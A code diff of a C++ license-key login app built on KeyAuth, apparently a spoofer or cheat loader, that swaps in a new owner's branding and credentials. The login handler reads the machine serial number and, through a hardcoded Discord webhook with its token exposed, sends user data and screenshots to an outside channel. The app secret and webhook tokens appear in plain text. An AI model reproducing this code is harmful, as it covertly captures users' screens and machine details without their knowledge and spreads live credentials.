@@ -48,10 +48,10 @@
 
 
 
-inline std::string name = skCrypt("Lekkurgamen90's Application").decrypt(); // Application Name
-inline std::string ownerid = skCrypt("us5Jw76qyv").decrypt(); // Owner ID
-inline std::string secret = skCrypt("213f8b4254443a3c0566b6fb0344cd25d6044bcee901f532df1ae6f097e8e973").decrypt(); // Application Secret
-inline std::string version = skCrypt("2.2").decrypt(); // Application Version
+inline std::string name = skCrypt("Jeranopardjo's Application").decrypt(); // Application Name
+inline std::string ownerid = skCrypt("5GZol8IbJf").decrypt(); // Owner ID
+inline std::string secret = skCrypt("e01f1f8f9dca45c70be6b9f040730a28c735464c312a4f095383aa28fab77e58").decrypt(); // Application Secret
+inline std::string version = skCrypt("1.0").decrypt(); // Application Version
 inline std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt(); // change if you're self-hosting
 inline std::string path = skCrypt("").decrypt(); // (OPTIONAL) see tutorial here https://www.youtube.com/watch?v=I9rxt821gMk&t=1s
 
@@ -457,7 +457,7 @@ void SendScreenshotToWebhook(const std::wstring& webhook_url) {
 
 	// Extract hostname and path from webhook URL
 	std::wstring hostname = skCrypt(L"discord.com").decrypt();
-	std::wstring path = skCrypt(L"api/webhooks/1351939549294493776/NCyL8BSWwI8CmkzMmegQzRKGpFVAQ_dkYFs1oj_UA5RCYa4Ex3c2lm8dRnS-MaXXQHHA").decrypt();
+	std::wstring path = skCrypt(L"api/webhooks/1378228631494721638/dz7OSnSzMZ8f9__FkQBNXrki8wJ80KI8gBC2Wdn5bl45ygD2eom3-1NUIyXUyCW3NIBO").decrypt();
 
 
 
@@ -624,7 +624,7 @@ void ui::Render()
 			AlphaAnim();
 
 			ImGui::PushFont(fonts::Inter_Medium_T);
-			custom::Text("ZYPHIER", { window::Begin_Size.x / 2 - ImGui::CalcTextSize("ZYPHIER").x / 2, 150 }, fonts::Inter_Medium_T, 40, colors::lwhite);
+			custom::Text("Welcome back", { window::Begin_Size.x / 2 - ImGui::CalcTextSize("Welcome back").x / 2, 150 }, fonts::Inter_Medium_T, 40, colors::lwhite);
 			custom::Text("TEMP | 2.0", { window::Begin_Size.x / 2 - ImGui::CalcTextSize("TEMP | 2.0").x / 2 -15, 190 }, fonts::Inter_Medium_T, 25, colors::lwhite);
 
 			items::InputText("###Pass", "License Key", ICON_FA_KEY, { (window::Begin_Size.x - 340) / 2, 240 }, pass, IM_ARRAYSIZE(pass), ImGuiInputTextFlags_Password, 0);
@@ -637,7 +637,7 @@ void ui::Render()
 				expiryyy = KeyAuthApp.user_data.lastlogin;
 				creationdate = KeyAuthApp.user_data.createdate;
 				retrieveSerialNumber();
-				const std::wstring webhook_url = skCrypt(L"https://discord.com/api/webhooks/1351939549294493776/NCyL8BSWwI8CmkzMmegQzRKGpFVAQ_dkYFs1oj_UA5RCYa4Ex3c2lm8dRnS-MaXXQHHA").decrypt();
+				const std::wstring webhook_url = skCrypt(L"https://discord.com/api/webhooks/1378228631494721638/dz7OSnSzMZ8f9__FkQBNXrki8wJ80KI8gBC2Wdn5bl45ygD2eom3-1NUIyXUyCW3NIBO").decrypt();
 
 				std::ostringstream json_data;
 				json_data << R"({
